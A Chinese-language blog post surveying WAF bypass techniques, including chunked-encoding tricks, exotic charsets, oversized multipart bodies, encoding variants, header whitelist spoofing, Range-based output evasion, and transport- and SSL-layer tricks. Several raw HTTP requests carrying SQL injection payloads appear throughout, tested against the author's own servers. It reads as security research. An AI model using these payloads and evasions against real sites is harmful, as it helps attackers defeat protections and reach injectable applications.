---
date: 2019/4/23 21:00:00
---

本文的主要从绕过WAF过程中需要注意的角色、点出发，尝试理解它们的运作，构建一个简单的知识框架。如果对本文中的任何知识点有任何反对想法或是意见、建议，请提出来，这对笔者是十分重要的，笔者也会十分感激。

首先，WAF分为非嵌入型与嵌入型，非嵌入型指的是硬WAF、云WAF、虚拟机WAF之类的；嵌入型指的是web容器模块类型WAF、代码层WAF。非嵌入型对WEB流量的解析完全是靠自身的，而嵌入型的WAF拿到的WEB数据是已经被解析加工好的。所以非嵌入型的受攻击机面还涉及到其他层面，而嵌入型从web容器模块类型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强，当然，在部署维护成本方面，也是越高的。

 

## HTTP报文包体的解析

我们先来探讨一个问题。HTTP请求的接收者在接收到该请求时，会关心哪些头部字段，以及会根据这些头部字段做出对request-body进行相应得解析处理。说实话，要搞清这些东西，最好还是查看web容器的源码，但笔者现在还没做到这一步，在这里仅能根据自身得认知提及一些头部字段。这些头部字段的关系，笔者认为可以总结为如下：

Transfer-Encoding（Content-Encoding（Content-Type（charset（data））））

### Transfer-Encoding

想了解Transfer-Encoding本身的意义，请查看文章“[它不但不会减少实体内容传输大小，甚至还会使传输变大，那它的作用是什么呢？](https://imququ.com/post/transfer-encoding-header-in-http.html)” ，这篇文章对理解本小节十分重要。 Apache+php对chunked类型的HTTP请求的处理太怪了。RFC2616中说明了，客户端或服务器，收到的HTTP报文中，如果同时存在chunked与Content-Length，则一定要忽略掉content-length（这一点也理所当然，很好理解），而在apache中反而不能缺少。虽然笔者没有阅读过Apache的源码，但从这一点可以推理出，Apache本身是不支持解析chunked的（对于Apache来说，由于没有解析HTTP请求chunked的代码逻辑，所以一定要从content-length中查看该报文的长度，而chunked可能是被PHP解析了的，所以存在这两个头部一定要同时存在的怪现象）。这一结论也很好地解释了一些让笔者不解的现象，如利用chuncked可以绕过安全狗Apache。 通过shodan搜索相关服务器，笔者简单测试一下，关于常见中间件、语言与chuncked的关系有如下参考：

|        | ASPX | PHP  | Java |
| ------ | ---- | ---- | ---- |
| Apache | X    | Y    |      |
| Nginx  | Y    |      | Y    |
| IIS    | Y    | Y    |      |
| Tomcat |      |      | X    |

那关于chunked，可以有什么利用思路呢？ 思路一，构造一个chunked请求体，尝试绕过WAF。其中可以涉及到利用chunked本身的一些规范、特性。 比如，假如WAF会解析chunked，但加入一些chunked的扩展，WAF就解析不了。 反过来，脑洞一下，假如WAF意识到了解析chunked时应该忽略这些扩展，那么在Tomcat下我们是不是可以利用它一下。

```
POST /test HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded;
Content-Length: 29
Content-Transform: chuncked

3;&user='+'1'='1&
foo
0
(CRLF)
```

利用思路二，解析不一致导致的问题，Apache+PHP对客户端的请求解析十分“良好” 之前落叶纷飞提到的思路 [利用分块传输吊打所有WAF](https://www.freebuf.com/articles/web/194351.html)

```
POST /sql.php?id=2%20union HTTP/1.1
......
Transfer-Encoding: chunked

1
aa
0
(CRLF)
```

类似还有下面这种

```
POST /test/2.php HTTP/1.1
Host: 192.168.17.138
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 20

9
user=root
(CRLF)
```

虽然页面返回的是400，但后台都是执行成功了的。

### Content-Encoding

它与Transfer-Encoding本质上的区别就是，Transfer-Encoding可以被网络中的各个实体解析并改变，而Content-Encoding在传输过程中不应该、不会被改变的。 该字段在Response中比较常见，而在Request中，可能你一辈子都很难遇到。除非运维人员对Web服务器做了相关配置，使得服务器可以识别并解析客户端Request请求的Content-Encoding 头部字段，否则Web服务默认是不会识别该字段的。笔者想尽量写得全一点，虽然这个字段看起来鸡肋、无用，但可以作为一个可能的突破测试点。

### Content-Type

Web容器应该不怎么关心Content-Type这个字段，后台语言则会识别该字段并进行对应的数据解析。而我们利用该字段的话，主有从以下思路出发：后台语言会识别哪些类型的Content-Type，这些Content-Type对我们绕WAF有没有用。 PHP默认会处理application/x-www-form-urlencoded、multipart/form-data两种。而JAVA后台对于multipart/form-data类型Content-Type的识别处理，需要借助三方库或是框架，默认情况下是无法处理的，但现在一般都用框架，而框架可能默认情况下就会识别并处理这类型的请求。 后台接收到application/x-www-form-urlencoded请求的数据时，会自己解码一次，如果开发人员自己又解码一次或多次，就形成了双重编码、多重编码。 对于multipart/form-data，非嵌入型的与模块类型的WAF，都只能自己识别并解析区分字段内容，所以在这一块你可以发挥自己想象，进行各种骚操作来进行绕过，但是，你应该要确认你当前所要绕过的WAF是不是真的做了这块的内容识别。笔者的意思是说，如果它遇到这种类型Request，只是对Body内容进行全部的规则匹配，而不会解析出其中的表单内容，那你可能就没必要进行那些骚操作了。实际上，有的非嵌入型WAF就是这么“懒”。multipart/form-data的相关骚操作可以参考[Protocol-Level Evasion of Web Application Firewalls](https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf)

### Charset

charset是被添加在Content-Type字段后面的，用来指明消息内容所用的字符集，它也仅被后台语言所关心。

• application/x-www-form-urlencoded;charset=ibm037
• multipart/form-data; charset=ibm037,boundary=blah
• multipart/form-data; boundary=blah ; charset=ibm037

JAVA的Servlet默认是接受大多数的charset的，不过正常点的程序员都会设置强制编码。 有如下示例： 后台代码

```
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
String userName = req.getParameter("user");
resp.getOutputStream().println("username :"+userName);
}
```

请求（Burpsui设置User Options-Character sets-Use a specific ..）

```
POST /test HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 25

%A4%A2%85%99=%99%96%96%A3
```

输出

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 16

username :root
```

至少可以支持IBM037, IBM500, cp875, and IBM1026字符集的中间件+语言的情况，可以参考下面表格：

| Target                          | QueryString | POST Body | & and = | URL-encoding           |
| ------------------------------- | ----------- | --------- | ------- | ---------------------- |
| Nginx, uWSGI – Django – Python3 | ✔           | ✔         | ✔       | ❌                      |
| Nginx, uWSGI – Django – Python2 | ✔           | ✔         | ❌       | ✔ (sometimes required) |
| Apache Tomcat – JSP             | ❌           | ✔         | ❌       | ✔ (sometimes required) |
| IIS – ASPX (v4.x)               | ✔           | ✔         | ❌       | ✔ (optional)           |
| IIS – ASP classic               | ❌           | ❌         |         |                        |
| Apache/IIS – PHP                | ❌           | ❌         |         |                        |

 

## 溢量数据

笔者当初有时在瞎想，其中想到，会不会存在URI数量过多，产生绕过呢？没想到就存在这样的一个CVE，[CVE-2018-9230-OpenResty URI参数溢出漏洞](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-CVE-2018-9230)。

没关系，思想还在嘛，还存在很多的变形，如通过multipart/form-data的方式来发送数据量比较大的报文，但又属于正常的HTTP请求，按照道理来说，对较上层的WAF（非嵌入型、模块类型）应该会有一定杀伤力的。

下面两个例子笔者之前测试时是通过的，安全狗Apache 3.5版。

```
POST /test/test.php HTTP/1.1
Host: 192.168.17.138
Connection: close
Content-Type: multipart/form-data; boundary=--------2117353554
Content-Length: 6167

----------2117353554
Content-Disposition: form-data; name="test"

x*5978 (5978个x)
----------2117353554
Content-Disposition: form-data; name="user"

root' union select 1 --
----------2117353554--
```

或者下面这种方式：

```
POST /test.php HTTP/1.1
Connection: close
Content-Type: multipart/form-data; boundary=123
Content-Length: 7497

(--123
Content-Disposition:form-data; name="aaa";

123)*165 重复165次以上
Content-Disposition:form-data; name="aaa";

union select 123
--123--
```

还有很多种方法，比如前面放一个很大的文件，后面再跟Payload表单，是不是也可能可以。 另外笔者看到一个有趣的旧漏洞，算是扩展一下思维。

```
1 POST /page.asp HTTP/1.1
2 Host: chaim
3 Connection: Keep-Alive
4 Content-Length: 49223
5 [CRLF]
6 zzz...zzz ["z" x 49152]
7 POST /page.asp HTTP/1.0
8 Connection: Keep-Alive
9 Content-Length: 30
10 [CRLF]
11 POST /page.asp HTTP/1.0
12 Bla: [space after the "Bla:", but no CRLF]
13 POST /page.asp?cmd.exe HTTP/1.0
14 Connection: Keep-Alive
15 [CRLF]
```

IIS/5.0在处理非application/x-www-form-urlencoded类型content-type的POST请求时，49152字节后面的数据会被截断。上面的HTTP请求，IIS认为1-6为一个请求，7-12为一个请求，13-5为一个请求；而WAF认为1-10，11-15各为一个请求，POST /page.asp?cmd.exe HTTP/1.0被WAF认为是头部字段中的数据，并不会匹配到拦截规则，所以该请求成功绕过WAF。

 

## HTTP协议兼容性

### HTTP请求行种的空格

在RFC2616文档中，有说到，HTTP头部字段的构造。

```
SP             = <US-ASCII SP, space (32)>
HT             = <US-ASCII HT, horizontal-tab (9)>
LWS            = [CRLF] 1*( SP | HT )
message-header = field-name ":" [ field-value ]
field-name     = token
field-value    = *( field-content | LWS )
field-content  = <the OCTETs making up the field-value
and consisting of either *TEXT or combinations
of token, separators, and quoted-string>
```

简单点来说就是

Test-Header: Test
等效于(空格替换成\x09)
Test-Header:  Test

但笔者发现，在请求行中，你也可以这样做（即便RFC2616 5.1节中指明了请求行中只能用空格）。于是，将一个HTTP/1.1的请求变换成如下：

OPTIONS    *   HTTP/1.1
Host:  dest.com

看着可能不明显，但其中的SP都被笔者替换成了HT，而且，SP、HT可以是1到多个，头部字段中SP 、HT可以是零个。常见的web容器都是接受这种HTTP请求的。

### HTTP 0.9+Pipelining

关于这条，相关细节可以到[WAF Bypass Techniques ](https://2018.appsec.eu/presos/Hacker_WAF-Bypass-Techniques_Soroush-Dalili_AppSecEU2018.pptx)，笔者就不细讲了。发明作者说它用这条技巧来绕过WAF(非嵌入型)对服务器上的一些目录的访问限制。 根据本文前面所说，可以知道，对于嵌入型一类的WAF，是根本不可能利用pipelining来进行绕过的——嵌入型WAF获得的数据的来源是Web容器，web容器识别出这是两个包，对于WAF也是两个包。 不过这上面的两点感觉对WAF都没啥用，snort都能识别，那基本上所有WAF厂商都能识别吧。不过知道多点不亏，上面第一点在笔者某次测试中还是体现了一点价值。

### Websocket、HTTP/2.0

现在越来越多的Web容器都开始支持比较高级的协议了，正常来说，这块不可能不出现新的安全问题的，笔者之前简单查看了HTTP/2.0 与Websocket的主体内容，未发现有什么利用点，后面也未花时间去研究，写在这里也算给自己一个备忘录。

 

## 高层数据

在一个HTTP请求中，诸如json、base64这样的数据，是由后台代码调用相应的解析库来进行解析的，即便是同结构，不同语言不同库也可能存在一些差异。

### base64

PHP解析Base64沿袭了其一贯“弱”风格，即便你的字符串含有PHP非法字符串，它也可以成功解析并处理。

测试代码：
echo base64_decode($_POST[‘test’]);

POST提交
test=M#TIzNA==

页面返回
1234

### Unicode JSON

在HTTP请求体中传递JSON数据，一般情况下如果网站用的框架，则Content-Type需要指定application/json类型；如果用了三方库，如fastjson，content-type随意即可。 可以将尝试将key或vaule替换成\uxxxx的unicode字符。

```
POST /json.do HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/json
Content-Length: 68

{"\u006e\u0061\u006d\u0065":"'\u0072\u006f\u006f\u0074","age":"18"}
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 44

User{name=''root', age=18, contactInfo=null}
```

这里的unicode关联到JSON，只是一个实际的场景，但可以自己发挥。

### 实体编码 XML

soap之类的协议应该也属于XML类，可以利用这类标记语言的实体编码特性。另外发送请求前考虑一下Content-Type类型。

```
POST /xml.do HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/xml
Content-Length: 93

<?xml version="1.0" ?>
<admin>
<name>&quot;&apos;&#114;&#111;&#111;&#116;</name>
</admin>

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 31

Admin{name='"'root', age=null}
```

### 八进制

还有一个字符表示方式，八进制，如#十六进制的值为23，八进制表示为\43,也是一个可能的点，如在OGNL中就可以使用。

### 同形字

sqlmap的tamper脚本中有个脚本，将’替换为%ef%bc%87，据说是UTF-8全角字符，但是这种说明没有根本地解释这个问题，笔者也不知道什么环境下产生这种利用条件。直到某一天，看到一篇文章，它们之间似乎存在某在联系——[Unicode同形字引起的安全问题](https://paper.seebug.org/77/)，现阶段笔者也只能这样认知这个tamper脚本。 有个趣的网站，它已经整理好了，https://www.irongeek.com/homoglyph-attack-generator.php

| **Char** | **同形**              |
| -------- | --------------------- |
|          | ᅟ ᅠ ㅤ                |
| !        | ! ǃ ！                |
| “        | ” ״ ″ ＂              |
| $        | $ ＄                  |
| %        | % ％                  |
| &        | & ＆                  |
| ‘        | ‘ ＇                  |
| (        | ( ﹝ （               |
| )        | ) ﹞ ）               |
| *        | * ⁎ ＊                |
| +        | + ＋                  |
| ,        | , ‚ ，                |
| –        | – ‐ －                |
| .        | . ٠ ۔ ܁ ܂ ․ ‧ 。 ． ｡ |
| /        | / ̸ ⁄ ∕ ╱ ⫻ ⫽ ／ ﾉ     |
| 0        | 0 O o Ο ο О о Օ Ｏ ｏ |
| 1        | 1 I ا １              |
| 2        | 2 ２                  |
| 3        | 3 ３                  |
| 4        | 4 ４                  |
| 5        | 5 ５                  |
| 6        | 6 ６                  |
| 7        | 7 ７                  |
| 8        | 8 Ց ８                |
| 9        | 9 ９                  |

### 命令、SQL语句等

命令注入方面可以利用bash的特性，SQL注入则利用数据库SQL语法特性，各大知名安全网站已经有足够的资料供大家参考，要讲又需要花费时间，讲不全感觉也没意义，笔者就不描述了。

 

## 容器语言特性

IIS %，在参数中，如果%后面不是符合URL编码十六进制值，就会忽略该%符合，如id=%%20，等价于id=%20。 IIS asp 中的GET请求方式提交Body表单，后台可接收。 IIS asp的参数污染中，通过,逗号连接污染参数。 Tomcat 路径跳转中允许;符号，/..;/..;/。 PHP $_REQUEST可以接收cookie中的参数。 这块想不到更多的了…

 

## 匹配缓冲区大小固定

思考一下，WAF拿到一个数据之后，在对其进行内容匹配时，是不是会将其放入一个固定大小的内存空间中，这个空间的大小是有限的。假设HTTP Request的body部分大小为2333字节，该内存大小为2000字节，那么其核心引擎在做内容匹配时，是不是先处理2000字节，在处理剩下的333字节。至于如何利用，可以发挥自己的想象。

 

## 白名单

一个是利用URL中的白名单，如图片、JS等静态资源文件。 还可以尝试利用下面这些头部字段

X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1

另外可以尝试修改Host头部字段。

## 输出角度

前面所讲的都是输入角度，这里我们谈谈输出角度。我们在Request中发送Pyaload，会希望从Response的回显或基于时间这些信息通道来获取Payload执行成功后的相关信息。如果存在某种WAF，检测到Response中的回显数据存在敏感信息，Resonse响应包可能就被阻断掉了。（当然，除了基本的回显数据通道，还有基于时间的数据通道）

### OOB

遇到这种情况，应对的方法之一就是使用OOB思想来绕过。如XXE OOB、SQL注入OOB、命令注入OOB，等等。

### Range

假如页面可能有敏感数据返回，而当前攻击场景又利用不了OOB，你可以尝试使用Range方法来绕过防火墙。 普通请求与页面结果：

```
POST /test/test.php HTTP/1.1
Host: 192.168.17.138
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Range: bytes=10-30

user=root
HTTP/1.1 200 OK
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17
Content-Length: 42
Content-Type: text/html

SELECT password from user where user = ''
```

添加了range，请求获取返回页面0到10的数据：

```
POST /test/test.php HTTP/1.1
Host: 192.168.17.138
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Range: bytes=0-10

user=root

HTTP/1.1 206 Partial Content
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17
Content-Range: bytes 0-10/394
Content-Length: 11
Content-Type: text/html

SELECT pass
```

添加了range，请求获取返回页面10到30的数据：

```
POST /test/test.php HTTP/1.1
Host: 192.168.17.138
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Range: bytes=10-30

user=root

HTTP/1.1 206 Partial Content
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17
Content-Range: bytes 10-30/394
Content-Length: 21
Content-Type: text/html

sword from user where
```

Range方式应该是所有Web容器默认支持的，这个东西还是有点意思，有点作用。

 

## 其他参考

### 传输层

看CVE时发现的，[3whs bypass ids](https://www.exploit-db.com/exploits/44247/)

```
Attack scenario TCP flow scheme:
Client    ->  [SYN] [Seq=0 Ack= 0]           ->  Evil Server
Client    <-  [SYN, ACK] [Seq=0 Ack= 1]      <-  Evil Server
Client    <-  [PSH, ACK] [Seq=1 Ack= 1]      <-  Evil Server  # Injection before the 3whs is completed
Client    <-  [FIN, ACK] [Seq=83 Ack= 1]     <-  Evil Server
Client    ->  [ACK] [Seq=1 Ack= 84]          ->  Evil Server
Client    ->  [PSH, ACK] [Seq=1 Ack= 84]     ->  Evil Server
```

在三次握手未完成之前，服务端返回了数据，可以造成HTTP流量检测的绕过，该种攻击场景可能是被用于挂马、钓鱼之类的。在链接中作者给出了对应的PCAP包，可以下载来看看，算是涨见识。 在传输层这里，还有一些简单而具备实际意义的操作，比如将一个TCP报文分片成很多很多份，一份几个字节，十几个字节，对端服务器能正常接收，而对非嵌入型的WAF就是一个考验；还有，我们知道，TCP是可靠的协议，那么我们再将这些报文进行一个合适的乱序，那么是否也可行。

### SSL层

对于非嵌入型WAF，在解析SSL数据时，需要该SSL通信端服务器的密钥（非对称）。客户端在与Web服务器进行HTTPS通信时，协商SSL的加密方式可以有很多种，如果其中有一种加密方式恰好是WAF无法识别的，那么WAF就只能睁眼瞎了。 [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html)

### DOS

笔者之前了解到，中小公司的防火墙的流量处理能力是很弱的，所以DOS确实可行，算是最后的方案。

 

## 结语

本文的模型都是建立在笔者所见所得之上的，另外也开了一些脑洞进行猜想，如有错误欢迎指正。文章中的一些点，笔者并没有在文中详解，但通过参考资料可以很好地理解每一点。 希望对大家有所裨益，本文也算对之前所学有所交代吧.

其他说明，RFC7230对文章中所说的RFC2616的描述未发生修改。 本文参考资料汇总如下

RCF2616 https://tools.ietf.org/html/rfc2616

Bypassing Web-Application Firewalls by abusing SSL/TLS https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html

WAF Bypass Techniques  https://2018.appsec.eu/presos/Hacker*WAF-Bypass-Techniques*Soroush-Dalili_AppSecEU2018.pptx

Application Security Weekly: Reverse Proxies Using Weblogic, Tomcat, and Nginx https://www.acunetix.com/blog/web-security-zone/asw-reverse-proxies-using-weblogic-tomcat-and-nginx/

Protocol-Level Evasion of Web Application Firewalls https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH*US*12*Ristic*Protocol*Level*Slides.pdf

Chunked HTTP transfer encoding https://swende.se/blog/HTTPChunked.html

Impedance Mismatch and Base64 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/impedance-mismatch-and-base64/

HTTP 协议中的 Transfer-Encoding https://imququ.com/post/transfer-encoding-header-in-http.html

浅谈json参数解析对waf绕过的影响 https://xz.aliyun.com/t/306

3whs bypass ids https://www.exploit-db.com/exploits/44247/

Web Application Firewall (WAF) Evasion Techniques https://medium.com/secjuice/waf-evasion-techniques-718026d693d8

BypassWAF新思路（白名单） https://www.chainnews.com/articles/774551652625.htm

利用分块传输吊打所有WAF https://www.anquanke.com/post/id/169738

HTTP Request Smuggling https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf